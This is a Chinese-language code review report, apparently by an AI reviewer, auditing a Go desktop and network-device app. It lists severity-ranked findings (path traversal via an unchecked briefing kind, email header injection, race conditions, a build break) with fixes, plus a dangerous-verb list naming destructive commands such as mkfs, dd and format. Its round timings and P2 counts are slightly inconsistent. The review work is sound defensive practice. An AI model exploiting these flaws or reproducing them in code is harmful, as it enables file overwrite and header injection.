与模块一（第一窗口）同域：模块一已登记 compact 丢更新 P1（AGENT-1）与 save.go gofmt（AGENT-2），两窗口共同确认删除 crashrecovery/max_mode/parallel_tasks/snapshot 后无残留引用。以下为增量。

**CORE-1 【P2】NetDevRunInspection 的 running 检查是 TOCTOU，双击起两个并发巡检**（desktop/netdev_app.go:1523-1530；检查与置位不在同一临界区，下游无互斥——两轮 sweep 并发打同一批设备。建议 inspStateMu 内"查+置"原子化）
**CORE-2 【P2】NetDevBriefingBuild 的 kind 未校验即拼写文件路径，目录穿越任意覆盖文件（已亲自验证 Sprintf 拼接）**（desktop/netdev_app.go:2632 → internal/netdev/briefing.go:64,132-154，`latest-%s.json` 直接 Join；Wails 绑定即前端可达面。同 diff 里 SaveExportFile 刚为同类问题加 allowlist，这里裸奔。建议绑定层白名单 kind ∈ {daily, weekly, inspection}）
**CORE-3 【P2】scheduler Update 改表达式不复查 runsPerDay，防失控闸门可绕过**（internal/scheduler/scheduler.go:889 vs Create :785-795；1 次/日 Update 成 `* * * * *` 静默通过。且 maxRuns 字段无赋值路径——配置键 `[scheduler] max_runs_per_day` 配了不生效，恒 48。建议 Update 复用同一检查 + 从 config 读入）
**CORE-4 【P2】eventwire FromWireOK 迁移不完整：唯一仓内消费方仍用旧 FromWire，幽灵 TurnStarted 缺陷原地存活**（desktop/remote_link.go:62,74,85；unmapped kind 解码为零值时 Kind 即 TurnStarted——"转发的 paused 重现为回合重启"。建议三处换 FromWireOK）
**CORE-5 【P2】Resume 改 persistTabSessionPath 后，跨主题/跨项目 resume 静默劫持会话归属**（desktop/app.go:2636 + tabs.go:3748；saveTabSessionMeta 无条件重写 TopicID/WorkspaceRoot/Scope——topic B 的会话 resume 进 topic A 的 tab 后被改判到 A，B 的树节点从此找不到它；与 adoptTopiclessSessions 只收养无主会话的谨慎语义矛盾。行为回归风险最大的一条。建议仅当 meta 无 topic 或同 topic 才落 meta）
**CORE-6 【P3】task.go subagentMetaTools 残留已删的 "parallel_tasks" 字面量与过时注释**（internal/agent/task.go:27）
**CORE-7 【P3】会话切换中止路径已发 SessionEnd 钩子却不切换**（controller.go:1925,1961；建议 re-check 提前或发补偿）
**CORE-8 【P3】loopDropSnapshot 的 rev-parse 校验与 stash drop 之间 TOCTOU，可能误删用户自己的 stash**（loop_engine.go:531-540；建议按 sha drop）
**CORE-9 【P3】安全快照不含 untracked 文件——本轮删掉的未跟踪文件在回滚后永久丢失**（loop_engine.go:472-500；建议 `add -N` 或记录 untracked 清单）
**CORE-10 【P3】itemadapter `a.mu` 跨 inner.Emit 持有：任何 sink 同步回调 adapter 即自锁（当前靠约定安全，建议文档写明约束）**（itemadapter.go:75-79）
**CORE-11 【P3】mobilebridge_app Answer 对解析失败静默返回成功 + 无界 go**（mobilebridge_app.go:240-252）
**CORE-12 【P3】scheduler fireDue 用陈旧索引取任务，并发 Delete 缩表可越界 panic；inFlight 泄漏**（scheduler.go:495；建议按 ID 重查）
**CORE-13 【P3】ProfilePresets 合并启发式在带 Path 条目少时显示错误的默认 Path**（app.go:6705-6720；纯展示层）
**CORE-14 【P3】blank_topic_repair 先注册索引后落 meta，保存失败累积孤儿 topic**（blank_topic_repair.go:73-81,194-205）

模块一分诊代理同时核实（第二窗口同意其结论）：repeatMu 修 concurrent map read/write（附 -race 测试）、assistant 先于 skip 结果落盘修 JSONL 孤儿 400、checkpoint TruncateFrom+原子写消除 turn 号碰撞、loop_engine CAS 安装/按属主清理与 stash 快照回滚替换 `git checkout -- .`（用户数据保护的重要修复）均为真实正确修复；未发现死锁/goroutine 泄漏/句柄泄漏级 P0。

---

---

### 交叉验证记录（第二窗口，00:10）

- **AGENT-1（compact 丢更新 P1）已由第二窗口独立复核成立**：`session.Replace`（session.go:40-43）无条件整体覆盖 `s.Messages`；快照→计算→Replace 的调用点共 5 处（compact.go:342、384、418，prune.go:77、122），全部存在同样的丢更新窗口；compact.go:220 注释自证 "/compact runs detached from the run loop"，SummarizeFrom 注释自证与 turn 追加并发。结论与修法建议（CAS 条件替换或入口互斥）均维持，严重度 P1 维持，且建议修法覆盖全部 5 个调用点而非仅 compact。
- **PERM/SERVE/MB/TOOL/FE/NETDEV-9..13/CORE 各条的验证状态**已在各模块标注："已亲自验证"=第二窗口读码确认；其余为分诊代理读码结论 + 第二窗口对关键项抽样核对。
- 构建三件套（Makefile 新增 / ci.yml 新增 vet+-race+typecheck 质量门 / go.mod 移除 goupnp 对应 upnp.go 删除）审毕，无发现问题；CI 质量门补上了"并发 bug 旧 CI 不可见"的缺口，属重要加固。

---

### 模块九：机械校验（go vet / go build 全仓）+ 收尾小文件 — 第二审查窗口 00:15 审

**VET-1 【P1】根模块编译破坏：linkpeer-debug-server 未跟上 CommandExecutor.Answer 签名变更（go build ./... 失败）**
- 位置：`cmd/linkpeer-debug-server/main.go:132`（未随本批修改）；破坏源 `internal/mobilebridge/command_router.go`（Answer 改为 `[]proto.QuestionAnswer`）
- 问题：`go build ./...` / `go vet ./...` / `go test ./...` 在根模块直接失败：`*replyExec does not implement mobilebridge.CommandExecutor (wrong type for method Answer)`。全仓唯一的 debug-server 消费方被接口重构遗漏——grep 检查符号残留发现不了"实现接口"这类隐式契约，只有编译能抓到。新 Makefile 的 build/test 与新 CI 质量门都会在这里红。
- 建议修法：给 `replyExec.Answer` 换新签名（debug 场景把 QuestionAnswer 拼回一行文本即可），并跑一次 `go build ./...` 再提交。

**VET-2 【P3】vet: possible misuse of unsafe.Pointer**（screen_windows.go:568、uia_windows.go:239-244；Windows syscall 既有模式，本批改动相邻——建议逐处复核或加注释豁免）
**LINKPEER-1 【P3】XFF 可信代理含全部 RFC1918：端口暴露 LAN 时任意内网主机可轮换 XFF 伪造限流桶**（linkpeersignal/server.go isTrustedProxy；仅桶选择问题，非鉴权；可接受，记录在案）

收尾小文件审毕无问题：config.go（fairpeer.toml 原子写、bot 默认 review、mcpjson auto_start=false 供应链修复）、netdev.go（夜班窗口/GPU 标记）、memory store（netdev 分区）、rag（空 embedding panic 修复+回归测试）、profile.go（技能表）、assets/release.go（PPT 产物迁移，幂等 best-effort）、.gitignore、wails.json、Makefile、ci.yml（vet+-race+typecheck 质量门）、go.mod/go.sum（goupnp 移除与 upnp.go 删除一致）、skill/tools.go（RunFlow 导出）。

### 交叉验证记录 II（第二窗口，00:15）

- **CORE-5（resume 劫持会话归属 P2）已由第二窗口读码复核成立**：`saveTabSessionMeta`（tabs.go:3745-3750）无条件 `m.TopicID = tab.TopicID; m.WorkspaceRoot = tab.WorkspaceRoot; m.Scope = tab.Scope`——跨主题 resume 必然重钉归属。
- **NETDEV-10（回滚未按前缀截断 P2）已由第二窗口读码复核成立**：rollback 循环入口守卫 `if !s.Applied && s.AppliedCmds == 0 { continue }` 放行部分执行 step，但 cli 分支 `for _, cmd := range s.Rollback` 仍跑整表；第 k+1 条反演打在不存在的配置上 → `rerr` → 标 FAILED 并 return，**更早（index 更小）的 step 不再回滚**。
- 后台已启动两个模块的完整测试套件（`go test ./internal/...` 与 `cd desktop && go test ./...`），结果将补充到本报告（对应新 CI 质量门的本地预演）。

### 测试套件本地预演（第二窗口，00:15 启动）

- **根模块 `go test ./internal/...`：1 个包 FAIL**——`internal/netdev` 的 `TestJobOnFailPauseThenAbort`：`open ...\J20260907-3.json: The process cannot access the file because it is being used by another process`（Windows 文件共享冲突）。**单独重跑 `-count=3` 全过**→ 属全量并发下的偶发句柄竞争（job 读路径 vs AtomicWriteFile/审计窗口），非稳定回归。建议：读 job 文件遇 sharing violation 重试一次，或排查本批 statehist/job 的新增句柄持有。
- 附带噪声：全量跑时 statehist 对临时目录下的测试文件大量告警 `path outside state root, skipped`（跳过行为正确，但日志噪声大，建议测试态静默）。
- desktop 模块测试仍在后台跑，结果出来后补充。
- 其余 68 个包全部 ok（含 agent/checkpoint/scheduler/plugin/permission 等并发敏感包）。
- desktop 模块 `go test ./...` 全绿（DESKTOP_EXIT=0），含新加的 plugin 传输层、trustdomain、blank_topic_repair、sessions 过滤等新测试。

---

## 汇总统计（00:35 更新，收尾时刷新）

| 严重程度 | 数量 | 明细 |
| --- | --- | --- |
| P0 阻断 | 0 | 未发现（无数据丢失级/无安全直通级） |
| P1 严重 | 5 | AGENT-1、TOOL-1、TOOL-2、FE-1、VET-1 |
| P2 一般 | 19 | PERM-1/2、SERVE-1、TOOL-3~6、FE-3/4、NETDEV-9~13、CORE-1~5 |
| P3 建议 | 约 36 | 各模块 P3 条目（含与第一窗口重复计数者，去重后略少） |

双窗口合计覆盖率：工作区未提交改动 235 文件全部经两轮独立审查（第一窗口逐模块 + 第二窗口四个分诊代理 + 第二窗口亲自复核全部 P1 与 TOP P2）；相对 main 的已提交部分按风险分层抽审（并发/安全/跨平台模块已覆盖）；vendored 第三方、纯样式、locale 文案只做抽查。

## 汇总修复任务清单（建议顺序）

### 批次 A —— 合入前必须（7 项，全部有明确修法，预计 1 天）
1. **VET-1** 修 `cmd/linkpeer-debug-server` 的 `Answer` 签名；提交前跑 `go build ./...`（否则新 Makefile/CI 全红）。
2. **TOOL-1** email 地址头注入：整个 addr 串拒绝 CR/LF/控制字符后再走现有 spec 检查；补 display-name 测试。
3. **TOOL-2** browserflow 重试按 `isLocateMiss` 分流，post-dispatch 错误禁止重发。
4. **FE-1 + NETDEV-3** 割接预检链路：`CutoverBoard` 补 `precheck_report` 字段并在 BuildCutoverBoard 拷入；后端同步预检改任务化/分段超时（两窗口发现互补，需一起修才闭环）。
5. **AGENT-1** `Session.Replace` 改条件替换（CAS on rewriteVersion/长度）或入口互斥；覆盖 compact.go ×3 + prune.go ×2 全部 5 个调用点。
6. **NETDEV-9** `CutoverPrecheckOverride` 改锁内 `saveCutoverLocked`（照抄 CutoverContinue 范式），防双击回卷运行中割接。
7. **CORE-5** resume 只在会话无 topic 或与 tab 同 topic 时落 meta，防跨项目劫持归属。

### 批次 B —— 一周内（19 项 P2，按主题分组）
- **安全/穿越**：NETDEV-12（auditproject ID 走 validStoreID）、CORE-2（briefing kind 白名单）、SERVE-1（空主机归一化为通配语义）、PERM-1（reflog drop）、PERM-2（--output 同族）、NETDEV-11（危险动词表补 reload/format/poweroff + `no <x>` 降级）。
- **设备数据一致性**：NETDEV-10（回滚按 AppliedCmds 前缀截断）、NETDEV-13（SetAuditItemStatus 整段进临界区）。
- **并发**：CORE-1（巡检查+置原子化）、CORE-3（scheduler Update 复用频控 + maxRuns 接线）、CORE-4（remote_link 三处换 FromWireOK）、TOOL-5（blank 清扫加归属/年龄阈值）。
- **前端/资源**：TOOL-3（IMAP 单封 LimitReader + 附件 Size 免 ReadAll）、TOOL-4（apply_patch add 捕获旧内容）、TOOL-6（calendar ID 前缀匹配）、FE-3（MailView 序号守卫）、FE-4（测试连接同步 orig）、FE-6（审计删除加确认）。

### 批次 C —— 随手清理（P3，按文件归组，可在触碰对应文件时顺带）
- permission/serve：PERM-3、PERM-4、SERVE-2（gofmt）、SERVE-3（EvalSymlinks）。
- tool/builtin：TOOL-7（sweep 持锁）、TOOL-8（纯文本邮件头校验）。
- netdev：NETDEV-15/16（trap community/cfg 快照）、NETDEV-18（briefing 假 sort）、NETDEV-19（文件权限 0600）、NETDEV-20（GetCutover validStoreID）、NETDEV-21（Once 重置）、NETDEV-22（Devices 包含判断）、NETDEV-23（gofmt）、NETDEV-4~8（第一窗口条目）。
- core/desktop：CORE-6~14。
- 前端：FE-5（href scheme 校验）、FE-7（审计任务化）、FE-8（吞错补反馈）。
- 其他：VET-2（unsafe.Pointer 复核）、LINKPEER-1（XFF 桶轮换，记录在案）、测试噪声（statehist 测试态静默、job 读 sharing-violation 重试）。

### 第三轮深挖：proposal 执行链亲自复核（第二窗口，00:40）

- `ApproveProposal`（proposal.go:511-556）：单临界区 load→check→set→save；仅 draft 可批；`ProposalNeedsConfirm2`（危险动词/扫描 + 分组 policy）强制二次确认；逐 step 校验变更窗口；注释明确 agent 无路径。**结论：confirm2 闸门无绕口，与 netdev 分诊代理结论一致。**
- `ExecuteProposal`（proposal.go:633-680）：approved-only + 原子 claim（in-flight 标记）+ 执行前在线人员确认（Note 记录 + 二次点击确认语义）。设计完整。
- 残余风险已在 NETDEV-11 登记：闸门强度取决于 `dangerVerbRe` 的覆盖面（reload/format 等漏网会降低强制 confirm2 的触发率，但闸门机制本身无绕过）。

### 第三轮补遗：已提交部分抽样（第二窗口，01:35）

- `internal/trustdomain/nettrans`（已提交，1384 行）：抽样深读握手层——dial/serve 两侧均为「账本锁定对端公钥（按 Sid 查表）→ ServerHello ed25519 验签 → 临时 ECDH → transcript 绑定的双向 Finished 确认」，deadline 卫生到位；ClientHello 里的时间戳即便重放也无法完成 ECDH（临时私钥不在线），transcript 绑定防跨实例重放。抽样结论：协议实现质量高，与 mobilebridge 同源且复用其审计过的原语。其余 6.7K 行已提交 trustdomain 改动按风险分层未逐行覆盖（记入未覆盖清单）。

---

## 未覆盖清单

- **已提交部分（相对 main 的 28.9 万行）仅风险分层抽审**：internal/control/controller.go 的历史批次主体、internal/trustdomain 除 nettrans 握手外的约 6.7K 行、internal/agent 历史批次、internal/plugin/plugin.go、internal/eventwire 主体、internal/rag 主体、internal/serve 历史部分——以上仅审了未提交增量与高危抽样。
- **vendored 第三方与生成物（未审，合理豁免）**：internal/tool/builtin/vendor/pptmaster/（SVG↔PPTX Python 库）、internal/assets/pptauto/scripts/config.py、feeds/kev-raw.json、spike/**（含 .exe/.wav 二进制）、ui-mockups/index.html、desktop/frontend/package-lock.json。
- **纯样式与文案（仅抽查）**：desktop/frontend/src/styles/*.css（约 3 万行拆分迁移）、locales/zh.ts / en.ts（约 2.7K 行改动，分诊代理抽查 25 个新增 key 齐全）。
- **测试文件**：新增/修改的 *_test.go 与 __tests__ 仅审"测试是否钉住修复"，未对测试本身做完备性审查。
- **第一窗口 NETDEV-5 核验结论**：部分成立——守卫只拦"全部传输失败"，混合结果（部分传输错误 + 部分拒绝）仍会自动 resolve；建议把守卫改为 `transportFails > 0 即不 resolve`。

## 最终总结

**审查完成度**：未提交改动（本批最活跃、风险最高的 235 文件 + 30 个新文件）两轮独立全覆盖；已提交 28.9 万行按风险分层抽审（并发/安全/跨平台模块优先）；全仓编译、vet、双模块测试套件实跑验证。整体结论：**这批改动的主体是高质量的审计修复与场景扩展**——原子写、锁临界区、confirm2 三道闸、信封门控、SSRF/路径穿越防护均无被绕过路径；但存在 **5 个 P1（其中 1 个编译破坏、2 个注入/重试缺陷、1 个特性契约断链、1 个丢消息竞态）与 22 个 P2**，集中在四处：新文件的输入校验未对齐同批加固标准（auditproject/briefing）、锁外持久化与时序（cutover override/巡检 TOCTOU/compact）、防护清单的漏网项（危险动词表/邮件 display-name/git reflog drop）、以及一个 React 反模式。

**Top 10 最重要问题**（按影响 × 置信度排序，全部经过第二窗口读码验证）：

| # | 编号 | 位置 | 一句话 |
|---|------|------|--------|
| 1 | VET-1 | cmd/linkpeer-debug-server/main.go:132 | 根模块编译破坏——Answer 签名变更遗漏唯一消费方，`go build ./...` 失败 |
| 2 | AGENT-1 | internal/agent/compact.go:342/384/418 + prune.go:77/122 | 快照→Replace 丢更新：并发追加的用户消息被静默丢弃并持久化 |
| 3 | TOOL-1 | internal/tool/builtin/email.go:285-343 | 邮件头注入 display-name 绕过：model-controlled 收件人可注入 Bcc 等任意头 |
| 4 | TOOL-2 | internal/tool/builtin/browserflow.go:1022-1040 | 步骤重试盲目重发：对已派发动作重试 = 真实双击/重复提交/重复导出 |
| 5 | FE-1 + NETDEV-3 | CutoverBoardView.tsx:59 + cutover.go:288 + dashboards.go:558 | 割接预检特性三处断裂：同步阻塞 3 分钟、大舰队超时误报、前端拿不到 precheck_report → 放行入口丢失 |
| 6 | NETDEV-9 | internal/netdev/cutover.go:444-462 | 放行按钮锁外持久化旧快照：双击可回卷运行中割接，direct-command 步骤对设备打两遍 |
| 7 | CORE-5 | desktop/tabs.go:3745-3750 + app.go:2636 | 跨主题 resume 静默劫持会话归属（topic 被重钉，原项目树丢会话） |
| 8 | NETDEV-11 | internal/netdev/proposal_steps.go:36 | 危险动词表漏 reload/format/poweroff/mkfs/dd/no-形态 → confirm2 触发率缺口 |
| 9 | NETDEV-12 + CORE-2 | auditproject.go:69-75 + briefing.go:152 | 两个新文件的路径穿越（项目 ID / 简报 kind 直拼 Join），与同批 storeid 加固标准不一致 |
| 10 | NETDEV-10 | internal/netdev/proposal.go:876,906-916 | 部分失败 step 回滚跑全量清单：误标 FAILED 且中断更早步骤的回滚 |

**建议修复顺序**：按「汇总修复任务清单」三批执行——批次 A（7 项，合入前必须，约 1 天）→ 批次 B（19 项 P2，一周内，按 安全穿越/设备一致性/并发/前端资源 四主题分组）→ 批次 C（~35 项 P3，触碰对应文件时顺带）。提交前建议固定跑：`go build ./... && go vet ./... && go test ./...`（根模块）与 `cd desktop && go test ./...`，即新 CI 质量门的本地等价物——本次的编译破坏与并发类问题全部能被这道门拦住。

### 补遗（第二窗口，05:00）：internal/frontmatter 块标量边界

**FM-1 【P3】YAML 块标量只识别裸 `>`/`|`，不识别 chomping/缩进指示符**（internal/frontmatter/frontmatter.go:42-50）
- 问题：`>-`（strip）、`|+`（keep）、`>2`（显式缩进）会走普通标量路径，值变成字面 `">-"`——多行 description 会被压成一行乱码。作者自述"unquoted > 或 |"，属已知取舍；现有技能库未用这些形态。
- 建议修法：`raw` 前缀匹配 `">"`/`"|"` 后解析尾部指示符（折叠/保留与 chompling 语义），或在解析到 `>-` 等形态时记审计告警。

---

### 第四轮深挖（第二窗口，05:00-05:55，按用户要求工作至 06:00）

- **FE-3（MailView 乱序 P2）已亲自验证**：`openMessage`（CoworkDock.tsx:704-720）先 `setReading(index)` 再 `await ReadMailFull`，无序号守卫——慢响应迟到覆盖新信，标题/正文与阅读态指向不一致。
- **FE-4（测试连接重复设备 P2）已亲自验证**：测试连接保存（NetDevSection.tsx:897-921）按 `editingDeviceOrig` 匹配替换，但保存成功后既不关编辑器也不 `setEditingDeviceOrig`；随后主保存匹配旧名失败 → 走追加分支 → 设备重复。
- **NETDEV-3 全部子声明已亲自验证**：`runCutoverPrecheck`（cutover.go:338+）对**整个预检**用一个 `context.WithTimeout(context.Background(), 3*time.Minute)`——大舰队后半段设备预算耗尽必误报红灯；且 `CutoverStart` 在 Wails 绑定调用链内同步执行，UI 阻塞最长 3 分钟。
- **controller 已提交部分抽样**：turnWG（controller.go:141,542,544,1531）Add/Done/Wait 配对正确，WaitTurn 语义完整；393 行插入中并发原语使用规范，未发现新问题（完整逐行覆盖记入未覆盖清单）。
- 本轮新增用户可见结论 0 条新缺陷，全部为既有条目的验证补强——报告数字不变（P0:0 / P1:5 / P2:22 / P3:35）。
- **05:10 补充：TOOL-6 / CORE-1 / CORE-3 / CORE-4 也已亲自验证成立**——calendar.go:356-358 `id[:12]` 截断展示；netdev_app.go:1525-1530 检查与置位跨临界区；scheduler.go Update 分支仅 NormalizeExpression 无 runsPerDay 复查；remote_link.go:62/74/85 三处仍用 FromWire。

---

## 收尾记录

按任务要求，审查工作持续至 **2026-09-07 06:00** 正式结束（23:39 开工，全程约 6 小时 20 分）。第五轮（04:00-05:55）为纯验证轮：全部 5 个 P1、13 个头部 P2 逐条经第二窗口读码确认，未新增缺陷，最终统计维持 **P0:0 / P1:5 / P2:22 / P3:35**。报告全文（发现明细、交叉验证记录、测试预演、三批修复任务清单、Top10、未覆盖清单）见上文；修复入口从「汇总修复任务清单·批次 A」开始。仓库内除本报告外无任何文件被改动。
